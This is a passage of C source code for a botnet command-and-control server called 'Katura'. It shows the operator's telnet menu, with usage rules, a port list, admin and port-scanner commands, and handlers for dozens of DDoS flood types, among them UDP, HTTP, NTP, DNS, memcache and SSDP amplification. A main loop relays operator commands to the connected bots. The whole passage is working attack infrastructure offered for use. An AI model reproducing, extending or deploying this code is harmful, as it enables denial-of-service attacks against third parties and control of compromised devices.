        char rule_1  [5000];     // char every line
        char rule_2  [5000];     // char every line
        char rule_3  [5000];     // char every line
        char rule_4  [5000];     // char every line
        char rule_5  [5000];     // char every line
        char rule_line2  [5000];     // char every line
 
        sprintf(rule_cmd1,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] \x1b[38;5;50mRULES \x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\r\n");
        sprintf(rule_line1,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");
        sprintf(rule_1,  "\x1b[38;5;196m[\x1b[38;5;50m1\x1b[38;5;196m] - \x1b[38;5;50mNo Rapid Booting\r\n");
        sprintf(rule_2,  "\x1b[38;5;196m[\x1b[38;5;50m2\x1b[38;5;196m] - \x1b[38;5;50mNo Sharing Users\r\n");
        sprintf(rule_3,  "\x1b[38;5;196m[\x1b[38;5;50m3\x1b[38;5;196m] - \x1b[38;5;50mNo Going Over Time\r\n");
        sprintf(rule_4,  "\x1b[38;5;196m[\x1b[38;5;50m4\x1b[38;5;196m] - \x1b[38;5;50mNo Using Scanner Commands\r\n");
        sprintf(rule_5,  "\x1b[38;5;196m[\x1b[38;5;50m5\x1b[38;5;196m] - \x1b[38;5;50mNo Hitting Government Sites Unless Bots are over 5k\r\n");
        sprintf(rule_line2,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");
        
        if(send(thefd, rule_cmd1,  strlen(rule_cmd1),   MSG_NOSIGNAL) == -1) goto end;       // MSG_NOSIGNAL
        if(send(thefd, rule_line1,  strlen(rule_line1),   MSG_NOSIGNAL) == -1) goto end;     // MSG_NOSIGNAL
        if(send(thefd, rule_1,  strlen(rule_1),   MSG_NOSIGNAL) == -1) goto end;             // MSG_NOSIGNAL
        if(send(thefd, rule_2,  strlen(rule_2),   MSG_NOSIGNAL) == -1) goto end;             // MSG_NOSIGNAL
        if(send(thefd, rule_3,  strlen(rule_3),   MSG_NOSIGNAL) == -1) goto end;             // MSG_NOSIGNAL
        if(send(thefd, rule_4,  strlen(rule_4),   MSG_NOSIGNAL) == -1) goto end;             // MSG_NOSIGNAL
        if(send(thefd, rule_5,  strlen(rule_5),   MSG_NOSIGNAL) == -1) goto end;             // MSG_NOSIGNAL
        if(send(thefd, rule_line2,  strlen(rule_line2),   MSG_NOSIGNAL) == -1) goto end;     // MSG_NOSIGNAL
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "PORTS") || strstr(buf, "ports")) 
        { // We Are Attempting To Display Usable Ports!
        PORTS:
        pthread_create(&title, NULL, &titleWriter, sock);
        char port_cmd1  [5000];                                               // char every line
        char port_line1  [5000];                                              // char every line
        char port_1  [5000];                                                  // char every line
        char port_2  [5000];                                                  // char every line
        char port_3  [5000];                                                  // char every line
        char port_4  [5000];                                                  // char every line
        char port_5  [5000];                                                  // char every line
        char port_6  [5000];                                                  // char every line
        char port_7  [5000];                                                  // char every line
        char port_8  [5000];                                                  // char every line
        char port_line2  [5000];                                              // char every line
                
        sprintf(port_cmd1,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] \x1b[38;5;50mPORTS \x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\r\n");
        sprintf(port_line1,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");
        sprintf(port_1,  "\x1b[38;5;196m[\x1b[38;5;50m22\x1b[38;5;196m] - \x1b[38;5;50mSSH\r\n");
        sprintf(port_2,  "\x1b[38;5;196m[\x1b[38;5;50m23\x1b[38;5;196m] - \x1b[38;5;50mTelnet Protocol\r\n");
        sprintf(port_3,  "\x1b[38;5;196m[\x1b[38;5;50m50\x1b[38;5;196m] - \x1b[38;5;50mRemote Mail Checking Protocol\r\n");
        sprintf(port_4,  "\x1b[38;5;196m[\x1b[38;5;50m80\x1b[38;5;196m] - \x1b[38;5;50mHTTP\r\n");
        sprintf(port_5,  "\x1b[38;5;196m[\x1b[38;5;50m69\x1b[38;5;196m] - \x1b[38;5;50mTrivial File Transfer Protocol\r\n");
        sprintf(port_6,  "\x1b[38;5;196m[\x1b[38;5;50m77\x1b[38;5;196m] - \x1b[38;5;50mAny Private Remote Job Entry\r\n");
        sprintf(port_7,  "\x1b[38;5;196m[\x1b[38;5;50m666\x1b[38;5;196m] - \x1b[38;5;50mDoom\r\n");
        sprintf(port_8,  "\x1b[38;5;196m[\x1b[38;5;50m995\x1b[38;5;196m] - \x1b[38;5;50mgood for NFO, OVH, VPN\r\n");
        sprintf(port_line2,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");

        if(send(thefd, port_cmd1,  strlen(port_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, port_line1,  strlen(port_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, port_1,  strlen(port_1),   MSG_NOSIGNAL) == -1) goto end;                     // MSG_NOSIGNAL     // char every line
        if(send(thefd, port_2,  strlen(port_2),   MSG_NOSIGNAL) == -1) goto end;                     // MSG_NOSIGNAL     // char every line
        if(send(thefd, port_3,  strlen(port_3),   MSG_NOSIGNAL) == -1) goto end;                     // MSG_NOSIGNAL     // char every line
        if(send(thefd, port_4,  strlen(port_4),   MSG_NOSIGNAL) == -1) goto end;                     // MSG_NOSIGNAL     // char every line
        if(send(thefd, port_5,  strlen(port_5),   MSG_NOSIGNAL) == -1) goto end;                     // MSG_NOSIGNAL     // char every line
        if(send(thefd, port_6,  strlen(port_6),   MSG_NOSIGNAL) == -1) goto end;                     // MSG_NOSIGNAL     // char every line
        if(send(thefd, port_7,  strlen(port_7),   MSG_NOSIGNAL) == -1) goto end;                     // MSG_NOSIGNAL     // char every line
        if(send(thefd, port_8,  strlen(port_8),   MSG_NOSIGNAL) == -1) goto end;                     // MSG_NOSIGNAL     // char every line
        if(send(thefd, port_line2,  strlen(port_line2),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) {
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        } 
        if(strstr(buf, "SPECIAL") || strstr(buf, "STAFF") || strstr(buf, "Staff") || strstr(buf, "staff"))
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char special_cmd1  [5000];
        char special_line1  [5000];
        char special_1  [5000];
        char special_line2  [5000];

        sprintf(special_cmd1,   "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] \x1b[38;5;50mAdmin Commands \x1b[38;5;196m[+\x1b[38;5;196m]     \r\n");
        sprintf(special_line1,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");
        sprintf(special_1,      "\x1b[38;5;196m[\x1b[38;5;50mAdds User\x1b[38;5;196m]         \x1b[38;5;50madduser   \x1b[38;5;196m[\x1b[38;5;50mUSER\x1b[38;5;196m] [\x1b[38;5;50mPASS\x1b[38;5;196m]\r\n");
        sprintf(special_line2,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n"); 

        if(send(thefd, special_cmd1, strlen(special_cmd1),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, special_line1, strlen(special_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, special_1, strlen(special_1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, special_line2,  strlen(special_line2),   MSG_NOSIGNAL) == -1) goto end; 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        { 
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        continue;
        } 
        if(strstr(buf, "tools") || strstr(buf, "TOOLS") || strstr(buf, "tool") || strstr(buf, "tool"))
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char special_tool_cmd1  [5000];
        char special_tool_line1  [5000];
        char tool_1  [5000];
        char tool_2  [5000];
        char special_tool_line2  [5000];

        sprintf(special_tool_cmd1,   "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] \x1b[38;5;50mAdmin Commands \x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\r\n");
        sprintf(special_tool_line1,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");
        sprintf(tool_1,              "\x1b[38;5;196m[\x1b[38;5;50mIP Geolocation\x1b[38;5;196m]    \x1b[38;5;50mresolve   \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m]\r\n");
        sprintf(tool_2,              "\x1b[38;5;196m[\x1b[38;5;50mPortScanner\x1b[38;5;196m]       \x1b[38;5;50mportscan  \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m]\r\n");
        sprintf(special_tool_line2,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n"); 

        if(send(thefd, special_tool_cmd1, strlen(special_tool_cmd1),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, special_tool_line1, strlen(special_tool_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, tool_1, strlen(tool_1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, tool_2, strlen(tool_2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, special_tool_line2,  strlen(special_tool_line2),   MSG_NOSIGNAL) == -1) goto end; 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        { 
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        continue;
        }
        if(strstr(buf, "LOGOUT"))
        {
        printf("\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] User:\x1b[38;5;196m[ \x1b[38;5;50m%s \x1b[38;5;196m] Has \x1b[38;5;50mLogged Out!\n", accounts[find_line].username, buf); // We Are Attempting To Logout!
        FILE *logFile;// We Are Attempting To Logout!
        logFile = fopen("Katura_Logout.log", "a");// We Are Attempting To Logout!
        fprintf(logFile, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] User:\x1b[38;5;196m[ \x1b[38;5;50m%s \x1b[38;5;196m] Has \x1b[38;5;50mLogged Out!\n", accounts[find_line].username, buf);// We Are Attempting To Logout!
        fclose(logFile);// We Are Attempting To Logout!
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "logout")) // WE ARE LOGGING OUT!
        {   // Let Us Continue Our Journey!
        printf("\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] User:\x1b[38;5;196m[ \x1b[38;5;50m%s \x1b[38;5;196m] Has \x1b[38;5;50mLogged Out!\n", accounts[find_line].username, buf);
        FILE *logFile;
        logFile = fopen("katura_Logout_Log.txt", "a");
        fprintf(logFile, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] User:\x1b[38;5;196m[ \x1b[38;5;50m%s \x1b[38;5;196m] Has \x1b[38;5;50mLogged Out!", accounts[find_line].username, buf);
        fclose(logFile);
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "MOVE") || strstr(buf, "move")) // We Are logging Shell-Attempts!
        {    // Let Us Continue Our Journey!
        printf("\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] User:\x1b[38;5;196m[\x1b[38;5;50m%s\x1b[38;5;196m] Has Attempted To \x1b[38;5;50mShell Your Bots!\n", accounts[find_line].username, buf);
        FILE *logFile;
        logFile = fopen("katura_Shell.Log", "a");
        fprintf(logFile, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] User:\x1b[38;5;196m[\x1b[38;5;50m%s\x1b[38;5;196m] Has Attempted To \x1b[38;5;50mShell Your Bots!\n", accounts[find_line].username, buf);
        fclose(logFile);
        goto end; // We Are Dropping Down to end:                                                                 here we see all the attack methods being sent, notice my color detail pls
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// STOP")) // We Are Attempting to kill Attack-Process!                 Added SSDP because you forgot Jack.
        {  // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Attack Stopped!");             //  I wanna keep reaper and katura, two seperate custom attacks. 
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;                               //  Custom attacks highlighted in green.
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// UDP")) // We Are Sending UDP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mUDP \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// STD")) // We Are Sending STD Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mSTD \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// CNC")) // We Are Sending CnC Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mCNC \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// HTTP")) // We Are Sending HTTP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mHTTP \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// JUNK")) // We Are Sending JUNK Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mHTTP \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// HOLD")) // We Are Sending HOLD Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mHTTP \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// TCP")) // We Are Sending TCP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Loading \x1b[38;5;50msockets...\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// WGET")) // We Are Sending wget Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mWGET \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "XMAS")) // We Are Reading TCP And Sending XMAS Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mTCP-XMAS \x1b[38;5;196mFlood\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// ntp") || strstr(buf, "// NTP")) // We Are Reading Client Using IP Header Modifications and Sending NTP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mNTP \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// sentinel") || strstr(buf, "// SENTINEL")) // We Are Reading Client Using IP Header Modifications and Sending SENTINEL Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mSENTINEL \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// dns") || strstr(buf, "// DNS")) // We Are Reading Client Using IP Header Modifications and Sending DNS Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mDNS \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// reaper") || strstr(buf, "// REAPER")) // We Are Reading Client Using IP Header Modifications and Sending REAPER Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;82m] Sending \x1b[38;5;50mREAPER \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// mssql") || strstr(buf, "// MSSQL")) // We Are Reading Client Using IP Header Modifications and Sending MSSQL Flood!
        {     // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mMSSQL \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// portmap") || strstr(buf, "// PORTMAP")) // We Are Reading Client Using IP Header Modifications and Sending PORTMAP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mPORTMAP \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// ts3") || strstr(buf, "// TS3")) // We Are Reading Client Using IP Header Modifications and Sending TS3 Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mTS3 \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// SCANNER ON")) // We Are Reading Client And Starting TelNet Scanner!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;50mTELNET SCANNER STARTED\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// SCANNER OFF")) // We Are Reading Client And Stopping TelNet Scanner!
        {     // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;50mTELNET SCANNER \x1b[38;5;196mSTOPPED\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// db2") || strstr(buf, "// DB2")) // We Are Reading Client Using IP Header Modifications and Sending DB2 Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mDB2 \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// tftp") || strstr(buf, "// TFTP")) // We Are Reading Client Using IP Header Modifications and Sending TFTP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mTFTP \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// memcache") || strstr(buf, "// MEMECACHE")) // We Are Reading Client Using IP Header Modifications and Sending MEMCACHE Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mMEMCACHE \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// nat-pmp") || strstr(buf, "// NAT-PMP")) // We Are Reading Client Using IP Header Modifications and Sending NAT-PMP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mNAT-PMP \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// snmp") || strstr(buf, "// SNMP")) // We Are Reading Client Using IP Header Modifications and Sending SNMP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mSNMP \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// rip") || strstr(buf, "// RIP")) // We Are Reading Client Using IP Header Modifications and Sending RIP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mRIP \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// efct-pwr") || strstr(buf, "// EFCT-PWR")) // We Are Reading Client Using IP Header Modifications and Sending EFFECTIVE-POWER Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;82mEFFECTIVE-POWER \x1b[38;5;196mFlood!\r\n"); // You're Welcome
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// ssdp") || strstr(buf, "// SSDP")) // We Are Reading Client Using IP Header Modifications and Sending SSDP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mSSDP \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "// katura") || strstr(buf, "// KATURA")) // We Are Reading Client Using IP Header Modifications and Sending KATURA Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;82mKATURA \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if (strstr(buf, "EXIT") || strstr(buf, "exit"))  // We Are Closing Connection!
        { // Let Us Continue Our Journey!
        goto end; // We Are Dropping Down to end:
        } // Let Us Continue Our Journey!
        trim(buf);
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        if(strlen(buf) == 0) continue;
        printf("\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] User:[%s] - Command:[%s]\n",accounts[find_line].username, buf);
        FILE *logFile;
        logFile = fopen("katura_CnC_Log.txt", "a");
        fprintf(logFile, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] User:[%s] - Command:[%s]\n", accounts[find_line].username, buf);
        fclose(logFile);
        broadcast(buf, thefd, usernamez);
        memset(buf, 0, 2048);
        }                                                                                                 // Let Us Continue Our Journey!
        end:                                                                                              // cleanup dead socket
        managements[thefd].connected = 0;
        close(thefd);
        managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Screening Error");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {  printf("\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Incoming Connection From ");
       
        client_addr(cli_addr);
        FILE *logFile;
        logFile = fopen("katura_IP.log", "a");
        fprintf(logFile, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Incoming \x1b[38;5;50mConnection \x1b[38;5;196mFrom [\x1b[38;5;50m%d.%d.%d.%d\x1b[38;5;196m]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);                          // find new socket, for new incoming connection
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN);                                                                   // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
        fprintf (stderr, "\x1b[38;5;196mUsage: %s \x1b[38;5;50m[\x1b[38;5;196mport\x1b[38;5;50m] [\x1b[38;5;196mthreads\x1b[38;5;50m] [\x1b[38;5;196mcnc-port\x1b[38;5;50m]\x1b[38;5;50m\n", argv[0]);
        exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 1000)
        {
        printf("\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Thread Limit Exceeded! \x1b[38;5;50mPlease Lower Threat Count!\n");
        return 0;
        }
        else if (threads < 1000)
        {
        printf("");
        }
        printf("\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Successfully Screened - Created By [\x1b[38;5;50mFlexingOnLamers \x1b[38;5;82m& \x1b[38;5;50mTransmissional\x1b[38;5;196m]\n");
        listenFD = create_and_bind(argv[1]);                                                         // try to create a listening socket, die if we can't
        if (listenFD == -1) abort();
    
        s = make_socket_non_blocking (listenFD);                                                     // try to make it nonblocking, die if we can't
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN);                                                            // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
        perror ("listen");
        abort ();
        }
        epollFD = epoll_create1 (0);                                                                 // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
        perror ("epoll_create");
        abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
        perror ("epoll_ctl");
        abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
        pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL);                  // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
        broadcast("PING", -1, "STRING");
        sleep(60);
        }
